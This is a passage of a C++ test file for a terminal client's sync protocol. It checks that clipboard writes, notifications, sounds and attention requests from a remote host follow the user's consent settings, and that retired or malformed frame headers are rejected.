    CHECK(observer.held[0].second == Ubiquitty::Capability::ClipboardWrite);
    const std::uint64_t first = observer.held[0].first;
    core.answerHeldHostEffect(first + 1, Sync::ConsentChoice::AllowOnce);
    CHECK(observer.writes.empty());
    core.answerHeldHostEffect(first, Sync::ConsentChoice::AllowOnce);
    REQUIRE(observer.writes.size() == 1);
    CHECK(observer.writes[0] == "first");
    // An answer is spent with the effect it released.
    core.answerHeldHostEffect(first, Sync::ConsentChoice::AllowOnce);
    CHECK_EQ(observer.writes.size(), 1u);

    // Once covers one write; a refusal discards the next.
    deliverHostClipboardWrite(core, "second");
    REQUIRE(observer.held.size() == 2);
    core.answerHeldHostEffect(observer.held[1].first, Sync::ConsentChoice::Deny);
    CHECK_EQ(observer.writes.size(), 1u);
    core.answerHeldHostEffect(observer.held[1].first, Sync::ConsentChoice::AllowOnce);
    CHECK_EQ(observer.writes.size(), 1u);

    // A newer write replaces the one still held; the replaced token is stale.
    deliverHostClipboardWrite(core, "third");
    deliverHostClipboardWrite(core, "fourth");
    REQUIRE(observer.held.size() == 4);
    core.answerHeldHostEffect(observer.held[2].first, Sync::ConsentChoice::AllowOnce);
    CHECK_EQ(observer.writes.size(), 1u);
    // A session answer releases it and lets later writes through unasked.
    core.answerHeldHostEffect(observer.held[3].first, Sync::ConsentChoice::AllowSession);
    REQUIRE(observer.writes.size() == 2);
    CHECK(observer.writes[1] == "fourth");
    deliverHostClipboardWrite(core, "fifth");
    CHECK_EQ(observer.held.size(), 4u);
    REQUIRE(observer.writes.size() == 3);
    CHECK(observer.writes[2] == "fifth");
}

// The verdict is the client's own configuration's, never the host's: a Deny
// drops what the host admitted, an Allow applies it unasked, and the effects of
// this machine's own daemon, or of a host that served the client's own code,
// stand as that host admitted them.
TEST(aHostsEffectsFollowTheClientsOwnPolicyForWhereTheHostRuns)
{
    using namespace Ubiquitty::Protocol;
    using Ubiquitty::CapabilityDecision;
    {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        const auto deny = remoteHostEscaping(CapabilityDecision::Deny);
        core.setHostEffectDecisions(decisionsFrom(deny));
        REQUIRE(welcomeCore(core));
        deliverHostClipboardWrite(core, "denied");
        deliverHostNotification(core, "denied");
        CHECK(observer.writes.empty() && observer.notifications.empty() && observer.held.empty());
    }
    {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        const auto allow = remoteHostEscaping(CapabilityDecision::Allow);
        core.setHostEffectDecisions(decisionsFrom(allow));
        REQUIRE(welcomeCore(core));
        deliverHostClipboardWrite(core, "allowed");
        deliverHostNotification(core, "allowed");
        CHECK(observer.writes.size() == 1 && observer.notifications.size() == 1 && observer.held.empty());
    }
    for (const auto location : { Sync::HostLocation::ThisMachine, Sync::HostLocation::ServedThisClient }) {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        core.setHostLocation(location);
        REQUIRE(welcomeCore(core));
        deliverHostClipboardWrite(core, "admitted");
        deliverHostNotification(core, "admitted");
        CHECK(observer.writes.size() == 1 && observer.notifications.size() == 1 && observer.held.empty());
    }
}

// The verdict is read at each effect, so a settings change reaches a
// connection that is already open: what was asked about is dropped once the
// client says Deny and applied once it says Allow, with no reconnect between.
TEST(aSettingsChangeReachesAnOpenConnectionAtItsNextEffect)
{
    using namespace Ubiquitty::Protocol;
    using Ubiquitty::CapabilityDecision;
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    Ubiquitty::CapabilityDecisionTable table;
    core.setHostEffectDecisions(decisionsFrom(table));
    REQUIRE(welcomeCore(core));
    deliverHostClipboardWrite(core, "asked");
    REQUIRE(observer.held.size() == 1);
    core.answerHeldHostEffect(observer.held[0].first, Sync::ConsentChoice::AllowSession);
    REQUIRE(observer.writes.size() == 1);
    table = remoteHostEscaping(CapabilityDecision::Deny);
    deliverHostClipboardWrite(core, "denied after the change");
    CHECK_MSG(observer.writes.size() == 1 && observer.held.size() == 1, "an answer outlived the Deny the person set in settings");
    table = remoteHostEscaping(CapabilityDecision::Allow);
    deliverHostClipboardWrite(core, "allowed after the change");
    CHECK(observer.writes.size() == 2 && observer.held.size() == 1);
}

// "Allow for This Connection" ends with the connection. A reconnect, possibly
// to another daemon instance, asks again, and an effect held for an answer is
// dropped with the connection that delivered it, so a later answer applies
// nothing.
TEST(aReconnectEndsWhatThePersonAllowedForTheConnection)
{
    using namespace Ubiquitty::Protocol;
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    const auto prompt = remoteHostEscaping(Ubiquitty::CapabilityDecision::Prompt);
    core.setHostEffectDecisions(decisionsFrom(prompt));
    REQUIRE(welcomeCore(core));
    deliverHostClipboardWrite(core, "first");
    REQUIRE(observer.held.size() == 1);
    core.answerHeldHostEffect(observer.held[0].first, Sync::ConsentChoice::AllowSession);
    deliverHostClipboardWrite(core, "covered");
    CHECK_EQ(observer.writes.size(), 2u);
    deliverHostNotification(core, "held across the reconnect");
    core.receivePaneEffect(postedEffect(Sync::EffectKind::Attention), Sync::AttentionEffect {}, Sync::EffectDisposition::Post);
    REQUIRE(observer.held.size() == 3);
    observer.core = &core;
    core.resetForReconnect();
    CHECK_MSG((observer.withdrawn == std::vector<std::uint64_t> { observer.held[1].first, observer.held[2].first }), "a reconnect dropped a held effect without telling the observer");
    CHECK_MSG(!observer.didSeeHeldEffectWhileEnding, "a held effect was still waiting while the connection's withdrawals were reported");
    REQUIRE(welcomeCore(core));
    core.setHostEffectDecisions(decisionsFrom(prompt));
    core.answerHeldHostEffect(observer.held[1].first, Sync::ConsentChoice::AllowOnce);
    CHECK_MSG(observer.notifications.empty(), "an effect held on the old connection was applied after the reconnect");
    deliverHostClipboardWrite(core, "asked again");
    CHECK_MSG(observer.writes.size() == 2, "Allow for This Connection outlived the connection");
    CHECK_EQ(observer.held.size(), 4u);
}

// One effect of each kind waits for its answer; none vanishes. A newer one of
// a kind replaces the one waiting and is announced before the one replaced is
// withdrawn, so a question shown for it can take the newer token; effects of
// other kinds wait beside it and are answered on their own.
TEST(aHeldEffectOfEachKindWaitsAndNoneVanishes)
{
    using namespace Ubiquitty::Protocol;
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    REQUIRE(welcomeCore(core));
    deliverHostClipboardWrite(core, "first write");
    deliverHostNotification(core, "a notification beside it");
    CHECK_MSG(observer.held.size() == 2, "an effect of another kind vanished while one waited");
    REQUIRE(observer.held.size() == 2);
    deliverHostClipboardWrite(core, "newer write");
    REQUIRE(observer.held.size() == 3);
    CHECK(observer.held[2].second == Ubiquitty::Capability::ClipboardWrite);
    CHECK((observer.withdrawn == std::vector<std::uint64_t> { observer.held[0].first }));
    core.answerHeldHostEffect(observer.held[0].first, Sync::ConsentChoice::AllowOnce);
    CHECK(observer.writes.empty());
    core.answerHeldHostEffect(observer.held[1].first, Sync::ConsentChoice::AllowOnce);
    CHECK((observer.notifications == std::vector<std::string> { "a notification beside it" }));
    core.answerHeldHostEffect(observer.held[2].first, Sync::ConsentChoice::AllowOnce);
    CHECK((observer.writes == std::vector<std::string> { "newer write" }));
}

// The held effect that has waited longest is asked about first. A newer one
// that replaces one of its kind takes that one's place in line, not the back
// of it, so an effect of another kind that arrived later still waits behind it.
TEST(aReplacedHeldEffectKeepsItsPlaceInLine)
{
    using namespace Ubiquitty::Protocol;
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    REQUIRE(welcomeCore(core));
    CHECK(!core.oldestHeldHostEffect());
    deliverHostClipboardWrite(core, "first write");
    deliverHostNotification(core, "a notification after it");
    deliverHostClipboardWrite(core, "newer write");
    REQUIRE(observer.held.size() == 3);
    const auto oldest = core.oldestHeldHostEffect();
    REQUIRE(oldest);
    CHECK_MSG(oldest->token == observer.held[2].first && oldest->capability == Ubiquitty::Capability::ClipboardWrite,
        "a replaced clipboard write went to the back of the line");
    core.answerHeldHostEffect(oldest->token, Sync::ConsentChoice::Deny);
    const auto next = core.oldestHeldHostEffect();
    REQUIRE(next);
    CHECK(next->token == observer.held[1].first);
}

// A host delivers one clipboard write that names several buffers as one effect
// for each, with the same items, one right after another. They join the write
// waiting, so the person is asked once and the answer writes every buffer; a
// write with other items replaces the one waiting.
TEST(aClipboardWriteToSeveralBuffersIsOneQuestion)
{
    using namespace Ubiquitty::Protocol;
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    REQUIRE(welcomeCore(core));
    deliverHostClipboardWrite(core, "copied", ClipboardBuffer::Clipboard, 1);
    deliverHostClipboardWrite(core, "copied", ClipboardBuffer::Primary, 2);
    CHECK_MSG(observer.held.size() == 1 && observer.withdrawn.empty(), "one write to two buffers asked two questions");
    REQUIRE(observer.held.size() == 1);
    core.answerHeldHostEffect(observer.held[0].first, Sync::ConsentChoice::AllowOnce);
    CHECK((observer.writes == std::vector<std::string> { "copied", "copied" }));
    CHECK((observer.buffers == std::vector<ClipboardBuffer> { ClipboardBuffer::Clipboard, ClipboardBuffer::Primary }));
    deliverHostClipboardWrite(core, "first", ClipboardBuffer::Clipboard, 3);
    deliverHostClipboardWrite(core, "second", ClipboardBuffer::Primary, 4);
    REQUIRE(observer.held.size() == 3);
    CHECK((observer.withdrawn == std::vector<std::uint64_t> { observer.held[1].first }));
    core.answerHeldHostEffect(observer.held[2].first, Sync::ConsentChoice::AllowOnce);
    CHECK(observer.writes.back() == "second" && observer.buffers.back() == ClipboardBuffer::Primary && observer.writes.size() == 3);

    // A later write of the same text to another buffer is a separate write,
    // whatever its bytes: it replaces the one waiting and is asked about, so
    // an answer never covers a buffer the person was not asked about.
    deliverHostClipboardWrite(core, "same", ClipboardBuffer::Clipboard, 5);
    deliverHostClipboardWrite(core, "same", ClipboardBuffer::Primary, 7);
    CHECK_MSG(observer.held.size() == 5, "a separate write of the same text joined the write waiting");
    REQUIRE(observer.held.size() == 5);
    core.answerHeldHostEffect(observer.held[4].first, Sync::ConsentChoice::AllowOnce);
    CHECK(observer.buffers.back() == ClipboardBuffer::Primary && observer.writes.size() == 4);
}

// The bit a client's Greet names says exactly whether its own gate is on for
// that connection: the host skips its question only for a client that will
// judge the effect itself, and never asks about what the client also judges.
// It is decided at every Greet, so it follows a carrier that now reaches
// another place, whoever observes the client.
TEST(aClientSaysItAsksAboutHostEffectsExactlyWhenItsGateIsOn)
{
    namespace Sync = Ubiquitty::Protocol::Sync;
    // Whether the next Greet the core builds names the bit.
    const auto asks = [](SyncClientCore& core) -> std::optional<bool> {
        std::vector<std::uint8_t> hello;
        core.buildHello(HandshakeRequest {}, hello);
        Sync::FrameDecoder decoder;
        decoder.append(hello);
        while (const auto frame = decoder.next()) {
            if (frame->kind != Sync::FrameKind::Greet)
                continue;
            const auto greeting = Sync::decodeGreet(frame->body);
            return greeting ? std::optional { greeting->capabilities.contains(Sync::ClientCapability::AsksAboutHostEffects) } : std::nullopt;
        }
        return std::nullopt;
    };
    for (const auto location : { Sync::HostLocation::AnotherMachine, Sync::HostLocation::ThisMachine, Sync::HostLocation::ServedThisClient }) {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        core.setHostLocation(location);
        REQUIRE(welcomeCore(core));
        deliverHostClipboardWrite(core, "judged here or not");
        const bool isGated = observer.writes.empty();
        CHECK_MSG(asks(core) == std::optional { isGated }, "a client's Greet said other than whether it judges what its host delivers");
    }
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    core.setClock([] { return 1; });
    core.setClientInstance({ 3, 4 });
    CHECK(asks(core) == std::optional { true });
    core.setHostLocation(Sync::HostLocation::ThisMachine);
    CHECK_MSG(asks(core) == std::optional { false }, "a carrier that now reaches this machine kept saying it asks");
}

// Sound reaches people who are not looking at the screen, so a remote host's
// is refused unless the client's configuration says otherwise. Asked about,
// tones and samples are both held: the sample's PCM is the connection's for one
// call, so the held sound keeps its own copy and plays exactly what was sent.
// A grant to play sound is good for one use whatever the answer.
TEST(aRemoteHostsSoundIsRefusedByDefaultAndHeldWithItsSample)
{
    using namespace Ubiquitty::Protocol;
    Ubiquitty::PAL::Context context;
    context.monotonicClock = +[] { return Ubiquitty::Ticks(0); };
    context.playTones = &recordPlayedTones;
    const Ubiquitty::PAL::ScopedContext scoped(context);
    playedTones = {};
    Sync::SoundEffect tones;
    tones.request.count = 1;
    tones.request.freqs[0] = 440;
    tones.request.volume = 4;
    tones.request.durationMilliseconds = 100;
    {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        REQUIRE(welcomeCore(core));
        core.receivePaneEffect(postedEffect(Sync::EffectKind::Sound), tones, Sync::EffectDisposition::Post);
        CHECK_EQ(playedTones.calls, 0);
        CHECK(observer.held.empty());
    }
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    const auto prompt = remoteHostEscaping(Ubiquitty::CapabilityDecision::Prompt);
    core.setHostEffectDecisions(decisionsFrom(prompt));
    REQUIRE(welcomeCore(core));
    const std::vector<std::int16_t> expected { 7, -7, 300, -300 };
    {
        std::vector<std::int16_t> lent = expected;
        Sync::SoundEffect sampled = tones;
        sampled.request.wave = 6;
        sampled.request.sampleSlot = 1;
        sampled.request.samplePCM = lent.data();
        sampled.request.sampleFrames = static_cast<std::uint32_t>(lent.size());
        core.receivePaneEffect(postedEffect(Sync::EffectKind::Sound), sampled, Sync::EffectDisposition::Post);
        lent.assign(lent.size(), 0);
    }
    CHECK_MSG(observer.held.size() == 1, "a sampled sound was dropped without asking");
    REQUIRE(observer.held.size() == 1);
    CHECK(observer.held[0].second == Ubiquitty::Capability::PlaySound);
    CHECK_EQ(playedTones.calls, 0);
    core.answerHeldHostEffect(observer.held[0].first, Sync::ConsentChoice::AllowAlways);
    CHECK_EQ(playedTones.calls, 1);
    CHECK_MSG(playedTones.lastSample == expected, "the held sample was not the one the host sent");
    core.receivePaneEffect(postedEffect(Sync::EffectKind::Sound), tones, Sync::EffectDisposition::Post);
    REQUIRE(observer.held.size() == 2);
    CHECK_EQ(playedTones.calls, 1);
    core.answerHeldHostEffect(observer.held[1].first, Sync::ConsentChoice::AllowOnce);
    CHECK_EQ(playedTones.calls, 2);
    CHECK(playedTones.lastSample.empty());
}

// An attention request makes this machine's window demand the person: a remote
// host's is refused unless the client's configuration says otherwise, asked
// about one use at a time when it says Prompt, and this machine's own daemon's
// stands as the daemon admitted it.
TEST(aRemoteHostsAttentionRequestFollowsTheClientsOwnPolicy)
{
    using namespace Ubiquitty::Protocol;
    {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        REQUIRE(welcomeCore(core));
        core.receivePaneEffect(postedEffect(Sync::EffectKind::Attention), Sync::AttentionEffect {}, Sync::EffectDisposition::Post);
        CHECK_MSG(observer.attention == 0, "a remote host's attention request reached the window unasked");
        CHECK(observer.held.empty());
    }
    {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        const auto prompt = remoteHostEscaping(Ubiquitty::CapabilityDecision::Prompt);
        core.setHostEffectDecisions(decisionsFrom(prompt));
        REQUIRE(welcomeCore(core));
        core.receivePaneEffect(postedEffect(Sync::EffectKind::Attention), Sync::AttentionEffect {}, Sync::EffectDisposition::Post);
        REQUIRE(observer.held.size() == 1);
        CHECK(observer.held[0].second == Ubiquitty::Capability::RequestAttention);
        CHECK_EQ(observer.attention, 0u);
        core.answerHeldHostEffect(observer.held[0].first, Sync::ConsentChoice::AllowSession);
        CHECK_EQ(observer.attention, 1u);
        // A grant for attention is good for one use whatever the answer.
        core.receivePaneEffect(postedEffect(Sync::EffectKind::Attention), Sync::AttentionEffect {}, Sync::EffectDisposition::Post);
        CHECK_EQ(observer.held.size(), 2u);
        core.answerHeldHostEffect(observer.held[1].first, Sync::ConsentChoice::Deny);
        CHECK_EQ(observer.attention, 1u);
    }
    {
        HostEffectObserver observer;
        SyncClientCore core(nullptr, &observer);
        core.setHostLocation(Sync::HostLocation::ThisMachine);
        REQUIRE(welcomeCore(core));
        core.receivePaneEffect(postedEffect(Sync::EffectKind::Attention), Sync::AttentionEffect {}, Sync::EffectDisposition::Post);
        CHECK(observer.attention == 1 && observer.held.empty());
    }
}

TEST(typedPaneReadersRefuseRawTitleAndStatusBeforeAnyObserver)
{
    struct Observer final : SyncClientObserver {
        unsigned decoded = 0;
        void onFrameDecoded(std::uint8_t, std::size_t, std::size_t) override { ++decoded; }
    };
    // Literal removed outer tags are unknown canonical frame kinds, before
    // their obsolete length fields can request any body allocation.
    for (const std::uint8_t tag : { 0x83, 0x88, 0x8f }) {
        CHECK(!Sync::frameKindOf(tag));
        for (const std::uint32_t size : { 0u, static_cast<std::uint32_t>(maxPayloadLength) }) {
            Observer observer;
            SyncClientCore core(nullptr, &observer);
            greetCore(core);
            const std::array<std::uint8_t, frameHeaderLength> header { tag,
                static_cast<std::uint8_t>(size), static_cast<std::uint8_t>(size >> 8),
                static_cast<std::uint8_t>(size >> 16), static_cast<std::uint8_t>(size >> 24) };
            CHECK(!core.feed(std::as_bytes(std::span { header })));
            CHECK(core.faulted());
            CHECK_EQ(observer.decoded, 0u);
        }
        Observer observer;
        SyncClientCore core(nullptr, &observer);
        REQUIRE(welcomeCore(core));
        const auto before = observer.decoded;
        const std::array<std::uint8_t, 5> formerHeader { tag, 0, 0, 0, 0 };
        CHECK(!core.feed(std::as_bytes(std::span(formerHeader))));
        CHECK(core.faulted());
        CHECK_EQ(observer.decoded, before);
    }
}

TEST(oldOuterHandshakeAndCarrierFramesAreNeverCanonicalAdmission)
{
    using namespace Ubiquitty::Protocol;
    struct Observer final : SyncClientObserver {
        unsigned decoded = 0;
        void onFrameDecoded(std::uint8_t, std::size_t, std::size_t) override { ++decoded; }
    };
    // Literal former outer tags are negative fixtures, not retained encoders.
    // 0x01/0x0E overlap current kinds but fail the canonical client direction
    // or pre-Welcome state, not an auxiliary retired-tag policy.
    for (const std::uint8_t raw : { 0x01, 0x81, 0x92, 0x0E }) {
        for (const std::uint32_t size : { 0u, static_cast<std::uint32_t>(maxPayloadLength) }) {
            Observer observer;
            SyncClientCore core(nullptr, &observer);
            greetCore(core);
            const std::array<std::uint8_t, 5> header { raw,
                static_cast<std::uint8_t>(size), static_cast<std::uint8_t>(size >> 8),
                static_cast<std::uint8_t>(size >> 16), static_cast<std::uint8_t>(size >> 24) };
            CHECK(!core.feed(std::as_bytes(std::span(header))));
            CHECK(core.faulted());
            CHECK_EQ(observer.decoded, 0u);
        }
    }
    // A valid current Welcome nested under the former outer carrier is not
    // accepted, either before or after canonical admission.
    for (const bool isWelcomed : { false, true }) {
        Observer observer;
        SyncClientCore core(nullptr, &observer);
        if (isWelcomed)
            REQUIRE(welcomeCore(core));
        else
            greetCore(core);
        const auto before = observer.decoded;
        const auto welcome = canonicalFrame(Sync::FrameKind::Welcome, canonicalBody(welcomeFixture()));
        const auto length = static_cast<std::uint32_t>(welcome.size());
        std::vector<std::uint8_t> formerCarrier { 0x0E, static_cast<std::uint8_t>(length),
            static_cast<std::uint8_t>(length >> 8), static_cast<std::uint8_t>(length >> 16), static_cast<std::uint8_t>(length >> 24) };
        formerCarrier.insert(formerCarrier.end(), welcome.begin(), welcome.end());
        CHECK(!core.feed(std::as_bytes(std::span(formerCarrier))));
        CHECK(core.faulted());
        CHECK_EQ(observer.decoded, before);
    }
}

UBIQUITTY_TEST_MAIN()
